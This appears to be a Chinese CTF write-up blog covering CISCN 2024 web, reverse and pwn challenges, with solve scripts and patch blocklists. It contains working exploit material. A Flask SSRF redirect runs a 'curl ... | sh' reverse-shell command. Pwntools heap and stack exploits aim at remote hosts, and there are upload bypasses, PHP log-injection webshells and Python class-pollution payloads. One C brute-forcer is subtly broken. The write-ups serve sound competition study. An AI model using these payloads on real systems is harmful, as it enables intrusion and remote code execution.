猜测对参数进行了校验，修改成手册中完整的请求/index.php?s=api&amp;c=api&amp;m=qrcode&amp;thumb=http://47.99.77.52/&amp;text=1&amp;size=h&amp;level=1
返回此图片不是一张可用的图片，应该是对网页的返回值进行了检查
在官网下载 迅睿CMS开发框架 查看源代码(之前看的一直是github上的项目，后来发现竟然与题目用的不一样。。。)
# dayrui\Fcms\Control\Api\Api.php//生成二维码图片require_once CMSPATH.&#x27;Library/Phpqrcode.php&#x27;;$file = WRITEPATH.&#x27;file/qrcode-&#x27;.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).&#x27;-qrcodpng&#x27;;if (!IS_DEV &amp;&amp; is_file($file)) &#123;    $QR = imagecreatefrompng($file);&#125; else &#123;    \QRcode::png($value, $file, $errorCorrectionLevel, $matrixPointSize, 3);    if (!is_file($file)) &#123;        exit(&#x27;二维码生成失败&#x27;);    &#125;    $QR = imagecreatefromstring(file_get_contents($file));    if ($thumb) &#123;        if (strpos($thumb, &#x27;https://&#x27;) !== false            &amp;&amp; strpos($thumb, &#x27;/&#x27;) !== false            &amp;&amp; strpos($thumb, &#x27;http://&#x27;) !== false) &#123;            exit(&#x27;图片地址不规范&#x27;);        &#125;        $img = getimagesize($thumb);        if (!$img) &#123;            exit(&#x27;此图片不是一张可用的图片&#x27;);        &#125;        $code = dr_catcher_data($thumb);        if (!$code) &#123;            exit(&#x27;图片参数不规范&#x27;);        &#125;        $logo = imagecreatefromstring($code);        $QR_width = imagesx($QR);//二维码图片宽度        $logo_width = imagesx($logo);//logo图片宽度        $logo_height = imagesy($logo);//logo图片高度        $logo_qr_width = $QR_width / 4;        $scale = $logo_width/$logo_qr_width;        $logo_qr_height = $logo_height/$scale;        $from_width = ($QR_width - $logo_qr_width) / 2;        //重新组合图片并调整大小        imagecopyresampled($QR, $logo, (int)$from_width, (int)$from_width, 0, 0, (int)$logo_qr_width(int)$logo_qr_height, (int)$logo_width, (int)$logo_height);        imagepng($QR, $file);    &#125;

因为有getimagesize，所以需要加个图片头
然后通过 dr_catcher_data 调用curl触发ssrf
# dayrui\Fcms\Core\Helper.php/** * 调用远程数据 curl获取 * * @param   $url * @param   $timeout 超时时间，0不超时 * @param   $is_log 0表示请求失败不记录到系统日志中 * @param   $ct 0表示不尝试重试，1表示重试一次 * @return  请求结果值 */// curl模式if (function_exists(&#x27;curl_init&#x27;)) &#123;    $ch = curl_init($url);    if (substr($url, 0, 8) == &quot;https://&quot;) &#123;        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, true); // 从证书中检查SSL加密算法是否存在    &#125;    if ($ct) &#123;        curl_setopt($ch, CURLOPT_HTTPHEADER, array(            &#x27;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)&#x27; . &#x27;Gecko/20100101 Firefox/40.0&#x27;,            &#x27;Accept: */*&#x27;,            &#x27;X-Requested-With: XMLHttpRequest&#x27;,            &#x27;Referer: &#x27;.$url,            &#x27;Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3&#x27;,        ));        curl_setopt($ch, CURLOPT_USERAGENT,&#x27;Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13)Gecko/20080311 Firefox/2.0.0.13&#x27;);    &#125;...&#125;

总共会请求两次，第一次的时候返回真实图片就好了，第二次再重定向到127.0.0.1

根据条件修改flask中的代码
# coding=utf-8from flask import *app = Flask(__name__)app.secret_key = &#x27;*************************&#x27;counter = 0@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def main():    global counter    if counter == 0:        counter += 1        return send_file(&#x27;img.png&#x27;, mimetype=&#x27;image/png&#x27;)    elif counter == 1:        counter = 0        return redirect(&quot;http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh&quot;)if __name__ == &quot;__main__&quot;:    app.run(host=&#x27;0.0.0.0&#x27;,port=80,debug=True)

反弹shell后执行readflag
reverseasm_reida上扣下来的arm汇编代码，丢给gpt翻译一下得到加密逻辑，爆一下就好了
lst = [0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7,       0x10d7, 0x1127, 0x2007, 0x11c7, 0x1e47,       0x1017, 0x1017, 0x11f7, 0x2007, 0x1037,       0x1107, 0x1f17, 0x10d7, 0x1017, 0x1017,       0x1f67, 0x1017, 0x11c7, 0x11c7, 0x1017,       0x1fd7, 0x1f17, 0x1107, 0x0f47, 0x1127,       0x1037, 0x1e47, 0x1037, 0x1fd7, 0x1107,       0x1fd7, 0x1107, 0x2787]for i in range(38):    for j in range(32, 128):        if (((j * 0x50) + 0x14) ^ 0x4D) + 0x1e == lst[i]:            print(chr(j), end=&#x27;&#x27;)            break# flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;



androidso_re有两个native函数用来获取key和iv，直接frida hook一下
Java.perform(() =&gt; &#123;  let jni = Java.use(&quot;com.example.re11113.jni&quot;);  jni[&quot;getkey&quot;].implementation = function () &#123;    console.log(`jni.getkey is called`);    let result = this[&quot;getkey&quot;]();    console.log(`jni.getkey result=$&#123;result&#125;`);    return result;  &#125;;  jni[&quot;getiv&quot;].implementation = function () &#123;    console.log(`jni.getiv is called`);    let result = this[&quot;getiv&quot;]();    console.log(`jni.getiv result=$&#123;result&#125;`);    return result;  &#125;;&#125;);

得到key&#x3D;A8UdWaeq,iv&#x3D;Wf3DLups，加密方式为DES-CBC

厨子解一下就好了

whereThel1b输入随机字符观察加密后的数据，每三位加密得到4位数据，猜是base64，直接爆破即可
import whereThel1bfrom string import hexdigitsimport itertoolshexdigits += &quot;lg&#123;&#125;-&quot;combinations = [&#x27;&#x27;.join(i) for i in itertools.product(hexdigits, repeat=3)]encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]flag = bytearray(b&quot;flag&#123;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#125;&quot;)for i in range(0, 14):    for combo in combinations:        flag[i*3:(i+1)*3] = combo.encode()        ret = whereThel1b.trytry(flag)        if ret[i*4:(i+1)*4] == encry[i*4:(i+1)*4]:            print(flag.decode())            break# flag&#123;7f9a2d3c-07de-11ef-be5e-cf1e88674c0b&#125;


gdb_debug伪随机数，从当前时间往前爆破seed解密即可
#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;time.h&gt;unsigned char key[38] = &#123;    0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88,    0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D,    0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78&#125;;void dump_data(unsigned char* data, size_t size, int type) &#123;    for (size_t i = 0; i &lt; size; i++)    &#123;   if (type)            printf(&quot;%c&quot;, data[i]);        else            printf(&quot;%d,&quot;, data[i]);    &#125;    printf(&quot;\n\n&quot;);&#125;void brute_force() &#123;    size_t length = 38;    unsigned char enc_data[] = &quot;congratulationstoyoucongratulationstoy&quot;;    unsigned char result[40], shuffled_result[40], final_result[40];    unsigned char shuffle_table[40];    unsigned char xor_key1[38];    unsigned char xor_key2[38];    unsigned int current_time = 1715788800;//(unsigned int)time(NULL);    printf(&quot;current time: %d\n&quot;, current_time);    for (unsigned int seed = current_time; seed &gt;= 0; --seed) &#123;        srand(seed &amp; 0xF0000000);        // 异或        for (size_t i = 0; i &lt; length; ++i) &#123;            xor_key1[i] = rand();        &#125;        // 生成表        for (size_t i = 0; i &lt; length; ++i) &#123;            shuffle_table[i] = i;        &#125;        // 打乱表        for (size_t k = length - 1; k; --k) &#123;            size_t rand_idx = rand() % (k + 1);            unsigned char temp = shuffle_table[k];            shuffle_table[k] = shuffle_table[rand_idx];            shuffle_table[rand_idx] = temp;        &#125;        // 异或        for (size_t i = 0; i &lt; length; ++i) &#123;            xor_key2[i] = rand();        &#125;        // ---------------------------------------------------        for (size_t i = 0; i &lt; length; ++i) &#123;            final_result[i] = enc_data[i] ^ key[i];        &#125;        for (size_t i = 0; i &lt; length; ++i) &#123;            final_result[i] ^= xor_key2[i];        &#125;        // 恢复打乱的数据        for (size_t i = 0; i &lt; length; ++i) &#123;            shuffled_result[shuffle_table[i]] = final_result[i];        &#125;        for (size_t i = 0; i &lt; length; ++i) &#123;            result[i] ^= xor_key1[i];        &#125;        if ( result[0] == &#x27;f&#x27;        &amp;&amp; result[1] == &#x27;l&#x27;        &amp;&amp; result[2] == &#x27;a&#x27;        &amp;&amp; result[3] == &#x27;g&#x27;        &amp;&amp; result[4] == &#x27;&#123;&#x27;) &#123;            dump_data(result, 38, 0);        &#125;    &#125;&#125;int main() &#123;    printf(&quot;magic........\n&quot;);    brute_force();&#125;



pwngostackfunc3中存在栈溢出，构造payload，但要小心rbp-0xc8与rbp-0xd0
from pwn import *#p=process(&quot;./gostack&quot;)p=remote(&quot;8.147.133.9&quot;,&quot;39706&quot;)e=ELF(&quot;./gostack&quot;)payload=b&quot;a&quot;*0x100+p64(0x4C0995)+p64(0x1c8)payload+=b&#x27;a&#x27;*0xc0+p64(0x4a0af6)p.sendlineafter(b&quot;message :&quot;,payload)p.interactive()

orange_cat_diaryfree时存在uaf，edit时允许溢出8字节，使用house of orange将top chunk放进unsorted bin，即可获取libc地址修改malloc_hook为gadget即可获取shell
from pwn import *def add(count,data=b&#x27;\n&#x27;):    pause()    p.sendlineafter(b&#x27;choice&#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;content:&#x27;,str(count).encode())    p.sendafter(b&#x27;content:&#x27;,data)def show():    p.sendlineafter(b&#x27;choice&#x27;,b&#x27;2&#x27;)def free():    p.sendlineafter(b&#x27;choice&#x27;,b&#x27;3&#x27;)def edit(count,data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;choice&#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;content&#x27;,str(count).encode())    p.sendafter(b&#x27;content&#x27;,data)    pause()libc=ELF(&quot;./libc-2.23.so&quot;)p=remote(&quot;8.147.131.196&quot;,&quot;32607&quot;)#p=process(&quot;./orange_cat_diary&quot;)#gdb.attach(p)p.sendlineafter(&#x27;name&#x27;,&#x27;rotwill&#x27;)add(0x68)edit(0x70,b&#x27;a&#x27;*0x68+p64(0x1001-0x70)[:-1])add(0x1000)add(0x68)#edit(0x60,b&#x27;a&#x27;*0x58+b&#x27;rotwilll&#x27;)show()p.readuntil(&#x27;:&#x27;)d=u64(p.read(8))print(hex(d))libc.address=d-0x3c510amalloc_hook=libc.sym[&#x27;__malloc_hook&#x27;]gadget=libc.address+0xf03a4print(hex(malloc_hook))free()edit(8,p64(malloc_hook-0x23))add(0x68)add(0x68,b&#x27;a&#x27;*0x13+p64(gadget))p.sendlineafter(b&#x27;choice&#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;content:&#x27;,&quot;123&quot;)p.interactive()

easybuf赛后出的
一个使用了protobuf的菜单题，只能申请0x30字节的chunk，输出的超过三次会关闭输出句柄，不过释放时存在uaf，所以可以利用fast bin构造tcache bin中的double free，之后就可以任意地址写了
from pwn import *import varintimport sysnum=0def Mode(m):    return b&#x27;\x10&#x27;+varint.encode(m&lt;&lt;1)def Ind(i):    return b&#x27;\x18&#x27;+varint.encode(i&lt;&lt;1)def Spbuf(s):    if s:        s=0x30    else:        s=0    return b&#x27;\x20&#x27;+varint.encode(s&lt;&lt;1)def Data(d):    return b&#x27;\x0a&#x27;+varint.encode(len(d))+ddef Spchr(s):    return b&#x27;\x28&#x27;+varint.encode(s)def calc(data):    mark=0xfff000000000    data1=data&amp;mark    result=0    result|=data1    for i in range(3):        data1=((data1&gt;&gt;12)^data)&amp;(mark&gt;&gt;12)        result|=data1        mark=mark&gt;&gt;12    return resultdef add(ind,data=b&#x27;\n&#x27;):    payload=Mode(1)+Ind(ind)+Data(data)+Spbuf(0)+Spchr(0)    if num!=3:        p.sendafter(&#x27;NT?\n&#x27;,payload)    else:        p.send(payload)def free(ind):    payload=Mode(2)+Ind(ind)+Data(b&#x27;test&#x27;)+Spbuf(0)+Spchr(0)    if num!=3:        p.sendafter(&#x27;NT?\n&#x27;,payload)    else:        p.send(payload)def none():    payload=Mode(0)+Ind(0)+Data(b&#x27;test&#x27;)+Spbuf(0)+Spchr(0)    if num!=3:        p.sendafter(&#x27;NT?\n&#x27;,payload)    else:        p.send(payload)def show(ind,isbuf=0,spchr=0):    global num    payload=Mode(3)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(b&#x27;test&#x27;)    if num!=3:        p.sendafter(&#x27;NT?\n&#x27;,payload)        p.readuntil(&#x27;Content:&#x27;)        num+=1    else:        p.send(payload)        pause#        p.readuntil(&#x27;Content:&#x27;)#context.log_level=&#x27;debug&#x27;p=process([&quot;./pwn&quot;])libc=ELF(&quot;./libc.so.6&quot;)add(0,b&quot;0&quot;)add(1,b&#x27;testtest&#x27;)show(0)d=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))libc.address=d-0x21ac30print(hex(libc.address))stdout=libc.sym[&#x27;_IO_2_1_stdout_&#x27;]vtable=stdout+0xd0print(hex(vtable))obstack_jump=libc.address+0x2173c0for i in range(6):    add(i+2)for i in range(7):    free(i)show(1)d=u64(p.readuntil(b&#x27;\n&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))chunk0=calc(d)print(f&quot;&#123;chunk0=: x&#125;&quot;)free(7)system=libc.sym[&#x27;system&#x27;]chunk6=chunk0+0x1d60chunk7=chunk0+0x2020obstack=p64(system)obstack+=b&#x27;/bin/sh\x00&#x27;+p64(chunk7+8)#obstack=obstack.ljust(0x28,b&#x27;\x00&#x27;)+p64(0x7fffffffffffffff)+p64(0)+p64(system)payload=p64(0)+p64(0x41)+p64((chunk6&gt;&gt;12)^(chunk7-0x10))add(6,payload)print(f&quot;&#123;chunk6=: x&#125;&quot;)print(f&quot;&#123;chunk7=: x&#125;&quot;)free(7)add(8,p64((chunk7&gt;&gt;12)^(chunk6)))print(hex(vtable))for i in range(7):    add(0,obstack)#show(0)#show(0)#@add(0)free(6)#add(8,p64()gdb.attach(p)pause()add(0,p64(0)+p64(0x40)+p64(((chunk6+0x10)&gt;&gt;12)^(vtable)))#add(1,obstack)#payload1=p64(0)+p64(obstack_jump)+p64(chunk7-0x38)add(2,payload1)add(2,payload1)#add(0)#print(hex(calc(d)))p.interactive()


EzHeapfrom pwn import *context.arch=&#x27;amd64&#x27;def add(l,data=b&#x27;\n&#x27;):    p.sendlineafter(b&#x27;&gt;&gt; &#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;size:&#x27;,str(l).encode())    p.sendafter(b&quot;content:&quot;,data);    passdef free(ind):    p.sendlineafter(b&#x27;&gt;&gt; &#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&quot;idx&quot;,str(ind).encode())def edit(ind,data):    p.sendlineafter(b&#x27;&gt;&gt; &#x27;,b&#x27;3&#x27;)    p.sendlineafter(b&#x27;idx:&#x27;,str(ind).encode())    p.sendlineafter(b&#x27;size:&#x27;,str(len(data)).encode())    p.sendafter(&#x27;content:&#x27;,data)def show(ind):    p.sendlineafter(b&#x27;&gt;&gt; &#x27;,b&#x27;4&#x27;)    p.sendlineafter(&#x27;idx&#x27;,str(ind).encode())def exit():    p.sendlineafter(b&#x27;&gt;&gt; &#x27;,b&#x27;5&#x27;)#p=process(&quot;EzHeap&quot;)p=remote(&quot;8.147.134.47&quot;,&quot;35955&quot;)libc=ELF(&quot;./libc.so.6&quot;)#gdb.attach(p,&#x27;bp setcontext+0x3d&#x27;)add(0x300) #0add(0x448) #1add(0x300) #2add(0x438) #3add(0x300) #4free(1)add(0x500)edit(0,b&#x27;a&#x27;*0x308+b&#x27;rotwilll&#x27;)show(0)p.readuntil(&#x27;rotwilll&#x27;)large=u64(p.readuntil(&#x27;Welcome&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(large))pause()libc.address=large-0x21b0e0stdout=libc.sym[&#x27;_IO_2_1_stdout_&#x27;]wfile_jump=libc.sym[&#x27;_IO_wfile_jumps&#x27;]iolist=libc.sym[&#x27;_IO_list_all&#x27;]success(f&quot;libcaddr=0x&#123;libc.address:x&#125;&quot;)edit(0,b&#x27;a&#x27;*0x308+p64(0x451)+p64(large)*2+p64(iolist-0x20)*2)free(3)add(0x500)edit(0,b&#x27;a&#x27;*0x308+b&#x27;rotwilll&#x27;)show(0)p.readuntil(&#x27;rotwilll&#x27;)chunk=u64(p.readuntil(&#x27;Welcome&#x27;,drop=1).ljust(8,b&#x27;\x00&#x27;))print(hex(chunk))fake_io_add=chunkchunk1=chunk-0x300gs=chunk1shelladd=chunk1+0x200shellcode=shellcraft.open(&quot;flag&quot;)+shellcraft.read(3,chunk,0x300)+shellcraft.write(1,chunk,0x300)mprotect=libc.sym[&#x27;mprotect&#x27;]setcontext=libc.sym[&#x27;setcontext&#x27;]gadget=libc.address+0x167420fake_io=flat(&#123;    0x28: [gs,1],    0x98: fake_io_add+0x28,    0xa0: fake_io_add,    0xd8: wfile_jump+0x30,    &#125;,filler=b&#x27;\x00&#x27;)gsdata=flat(&#123;    8: [gs,shelladd],    0x20: setcontext+0x3d,    0x28: gadget,    0x68: gs&amp;(~0xfff), # rdi    0x70: 0x1000, # rsi    0x88: 7, # rdx    0xa0: gs+0x10, #rsp    0xa8: mprotect, #rcx-&gt;rip    0xe0: gs    &#125;,filler=b&#x27;\x00&#x27;)#payload=fake_io#+asm(shellcode)payload=gsdatapayload=payload.ljust(0x200,b&#x27;\x00&#x27;)payload+=asm(shellcode)payload=payload.ljust(0x300)#add(0x438,payload[0x10:])payload=payload+fake_ioedit(2,payload)#exit()p.interactive()



crypto古典密码
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2024竞赛</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>第十七届全国大学生信息安全竞赛-华东南分区赛</title>
    <url>/posts/deeac2cd/</url>
    <content><![CDATA[1签到+4web+4pwn
web-welcome签到，Ctrl+U

web-submitbreak文件上传，有对内容检测，使用短标签绕过


fix添加黑名单
&lt;?php// $path = &quot;./uploads&quot;;error_reporting(0);$path = &quot;./uploads&quot;;$content = file_get_contents($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;]);$allow_content_type = array(&quot;image/png&quot;);$type = $_FILES[&quot;myfile&quot;][&quot;type&quot;];if (!in_array($type, $allow_content_type)) &#123;    die(&quot;只允许png哦!&lt;br&gt;&quot;);&#125;// 修改点$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;,&quot;.htaccess&quot;);$file_name = trim($_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;]);$file_ext = strrchr($file_name, &#x27;.&#x27;);$file_ext = strtolower($file_ext);$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);$file_ext = trim($file_ext);if (in_array($file_ext, $deny_ext)) &#123;	die(&#x27;此文件不允许上传!&#x27;);&#125;if (preg_match(&#x27;/(php|script|xml|user|htaccess)/i&#x27;, $content)) &#123;    // echo &quot;匹配成功!&quot;;    die(&#x27;鼠鼠说你的内容不符合哦0-0&#x27;);&#125; else &#123;    $file = $path . &#x27;/&#x27; . $_FILES[&#x27;myfile&#x27;][&#x27;name&#x27;];echo $file;if (move_uploaded_file($_FILES[&#x27;myfile&#x27;][&#x27;tmp_name&#x27;], $file)) &#123;        file_put_contents($file, $content);        echo &#x27;Success!&lt;br&gt;&#x27;;&#125; else &#123;        echo &#x27;Error!&lt;br&gt;&#x27;;&#125;&#125;?&gt;&lt;!----&gt;





web-粗心的程序员break扫目录，得到www.zip
&lt;?phperror_reporting(0);include &quot;default_info_auto_recovery.php&quot;;session_start();$p = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]?:$_SERVER[&quot;REMOTE_ADDR&quot;];if (preg_match(&quot;/\?|php|:/i&quot;,$p))&#123;    die(&quot;&quot;);&#125;$time = date(&#x27;Y-m-d h:i:s&#x27;, time());$username = $_SESSION[&#x27;username&#x27;];$id = $_SESSION[&#x27;id&#x27;];if ($username &amp;&amp; $id)&#123;    echo &quot;Hello,&quot;.&quot;$username&quot;;    $str = &quot;//登陆时间$time,$username $p&quot;;    $str = str_replace(&quot;\n&quot;,&quot;&quot;,$str);    file_put_contents(&quot;config.php&quot;,file_get_contents(&quot;config.php&quot;).$str);&#125;else&#123;    die(&quot;NO ACCESS&quot;);&#125;?&gt;

home.php中会写入登录日志$str = &quot;//登陆时间$time,$username $p&quot;;
用?&gt;&lt;? phpinfo(); //截断注释输出phphinfo

或者写入一个换行后在xff中执行命令
fix对于写入日志的两个参数添加黑名单
home.php
&lt;?phperror_reporting(0);include &quot;default_info_auto_recovery.php&quot;;session_start();$p = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]?:$_SERVER[&quot;REMOTE_ADDR&quot;];// 修改点1$blacklist = [&quot;&gt;&quot;,&quot;&lt;&quot;,&quot;;&quot;,&quot;|&quot;,&quot;//&quot;,&quot;#&quot;,&quot;php&quot;,&quot;&#x27;&quot;,&quot;=&quot;];$p = str_replace($blacklist,&quot;&quot;,$p);if (preg_match(&quot;/\?|php|\&gt;|:/i&quot;,$p))&#123;    die(&quot;&quot;);&#125;$time = date(&#x27;Y-m-d h:i:s&#x27;, time());$username = $_SESSION[&#x27;username&#x27;];$id = $_SESSION[&#x27;id&#x27;];if ($username &amp;&amp; $id)&#123;    echo &quot;Hello,&quot;.&quot;$username&quot;;    // 修改点2    $blacklist = [&quot;&gt;&quot;,&quot;&lt;&quot;,&quot;;&quot;,&quot;|&quot;,&quot;//&quot;,&quot;#&quot;,&quot;?&quot;];    $username = str_replace($blacklist,&quot;&quot;,$username);    $str = &quot;//登陆时间$time,$username $p&quot;;    $str = str_replace(&quot;\n&quot;,&quot;&quot;,$str);    file_put_contents(&quot;config.php&quot;,file_get_contents(&quot;config.php&quot;).$str);&#125;else&#123;    die(&quot;NO ACCESS&quot;);&#125;?&gt;&lt;br&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-1.9.0.min.js&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.base64.js&quot;&gt;&lt;/script&gt;&lt;script&gt; ....&lt;/script&gt;更改用户名&lt;input type=&quot;text&quot; name=&quot;newusername&quot; id=&quot;newusername&quot; value=&quot;&quot;&gt;&lt;button type=&quot;submit&quot; onclick=&quot;submitData()&quot; &gt;更改&lt;/button&gt;


web-Pollutedbreakfrom flask import Flask, session, redirect, url_for,request,render_templateimport osimport hashlibimport jsonimport redef generate_random_md5():    random_string = os.urandom(16)    md5_hash = hashlib.md5(random_string)    return md5_hash.hexdigest()def filter(user_input):    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;]    for pattern in blacklisted_patterns:        if re.search(pattern, user_input, re.IGNORECASE):            return True    return Falsedef merge(src, dst):    # Recursive merge function    for k, v in src.items():        if hasattr(dst, &#x27;__getitem__&#x27;):            if dst.get(k) and type(v) == dict:                merge(v, dst.get(k))            else:                dst[k] = v        elif hasattr(dst, k) and type(v) == dict:            merge(v, getattr(dst, k))        else:            setattr(dst, k, v)app = Flask(__name__)app.secret_key = generate_random_md5()class evil():    def __init__(self):        pass@app.route(&#x27;/&#x27;,methods=[&#x27;POST&#x27;])def index():    username = request.form.get(&#x27;username&#x27;)    password = request.form.get(&#x27;password&#x27;)    session[&quot;username&quot;] = username    session[&quot;password&quot;] = password    Evil = evil()    if request.data:        if filter(str(request.data)):            return &quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;        else:            merge(json.loads(request.data), Evil)            return &quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;    return render_template(&quot;index.html&quot;)@app.route(&#x27;/admin&#x27;,methods=[&#x27;POST&#x27;, &#x27;GET&#x27;])def templates():    username = session.get(&quot;username&quot;, None)    password = session.get(&quot;password&quot;, None)    if username and password:        if username == &quot;adminer&quot; and password == app.secret_key:            return render_template(&quot;important.html&quot;, flag=open(&quot;/flag&quot;, &quot;rt&quot;).read())        else:            return &quot;Unauthorized&quot;    else:        return f&#x27;Hello,  This is the POLLUTED page.&#x27;if __name__ == &#x27;__main__&#x27;:    app.run(host=&#x27;0.0.0.0&#x27;,debug=True, port=80)

python原型链污染secret_key
&#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;app&quot;: &#123;                &quot;secret_key&quot;: &quot;dr0n111&quot;            &#125;        &#125;    &#125;&#125;

有关键字被过滤了，转成unicode绕过
&#123;    &quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;: &#123;        &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;: &#123;            &quot;\u0061\u0070\u0070&quot;: &#123;                &quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;: &quot;dr0n111&quot;            &#125;        &#125;    &#125;&#125;

污染后伪造key登录
python flask_session_cookie_manager3.py encode -s &quot;dr0n111&quot; -t &quot;&#123;&#x27;password&#x27;:&#x27;dr0n111&#x27;,&#x27;username&#x27;:&#x27;adminer&#x27;&#125;&quot;


登录后看到语法标识符不对，使用variable_start_string替换
&#123;    &quot;__init__&quot;: &#123;        &quot;__globals__&quot;: &#123;            &quot;app&quot;: &#123;                &quot;jinja_env&quot;: &#123;                    &quot;variable_start_string&quot;: &quot;[%&quot;,                    &quot;variable_end_string&quot;: &quot;%]&quot;                &#125;            &#125;        &#125;    &#125;&#125;

&#123;    &quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;: &#123;        &quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;: &#123;            &quot;\u0061\u0070\u0070&quot;: &#123;                &quot;\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076&quot;: &#123;                    &quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;: &quot;[%&quot;,                    &quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;: &quot;%]&quot;                &#125;            &#125;        &#125;    &#125;&#125;


因为缓存的原因，先污染在访问即可

fix增加黑名单
def filter(user_input):    blacklisted_patterns = [&#x27;init&#x27;, &#x27;global&#x27;, &#x27;env&#x27;, &#x27;app&#x27;, &#x27;_&#x27;, &#x27;string&#x27;, &#x27;005f&#x27;, &#x27;0074&#x27;, &#x27;006c&#x27;, &#x27;[%&#x27;]    for pattern in blacklisted_patterns:        if re.search(pattern, user_input, re.IGNORECASE):            return True    return False



web-bigfishbreak扫目录得到/admin和/login
访问admin会自动跳转到login，简单修改cookie就能直接登录
数据储存位置可以穿越目录，读取fish.js
